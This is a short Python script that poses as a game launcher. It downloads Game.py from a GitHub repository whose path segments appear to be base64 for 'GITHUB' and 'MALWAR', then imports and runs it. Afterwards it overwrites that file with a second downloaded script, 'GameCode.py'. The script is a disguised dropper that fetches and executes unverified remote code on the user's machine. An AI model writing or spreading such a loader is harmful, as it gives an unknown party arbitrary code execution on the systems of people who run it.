import platform
import subprocess
import sys
##subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
import requests
import os

response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/Game.py")
with open("Game.py", "w") as file:
    file.write(response.text)

import Game 
platform = platform.system()
Game.main(platform) ##Get platform-dependant game files

response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/GameCode.py")
with open("Game.py", "w") as file:
    file.write(response.text)
